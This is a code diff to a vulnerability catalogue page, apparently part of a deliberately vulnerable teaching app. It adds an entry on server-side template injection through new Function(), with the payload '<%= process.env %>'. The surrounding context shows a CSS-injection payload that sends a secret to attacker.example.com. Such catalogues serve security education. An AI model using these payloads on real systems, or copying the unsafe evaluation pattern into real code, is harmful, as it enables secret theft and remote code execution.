@@ -150,6 +150,16 @@ const vulns: VulnEntry[] = [
       "red; } * { background-image: url(//attacker.example.com/log?c=secret); } b {",
     refs: "CWE-79 · PortSwigger CSS Injection · Semgrep tainted-style-block",
   },
+  {
+    href: "/vuln/ssti",
+    title: "Server-Side Template Injection",
+    source: "POST /api/render body.template",
+    sink: "new Function() inside renderTemplate()",
+    description:
+      "EJS風の `<%= expr %>` を `new Function()` でサーバ側評価する自前テンプレートエンジン。テンプレート文字列をユーザーが投稿できる構成だと、攻撃者は任意JavaScriptをNode.jsプロセス上で実行できる。`process.env` 漏洩、ファイル読み取り、外部HTTPリクエストなどサーバレス関数の権限すべてが取れる。",
+    payload: "<%= process.env %>",
+    refs: "CWE-94 · CWE-1336 · OWASP A03 · Semgrep tainted-new-function · CodeQL js/code-injection",
+  },
 ];
 
 export default function VulnIndexPage() {
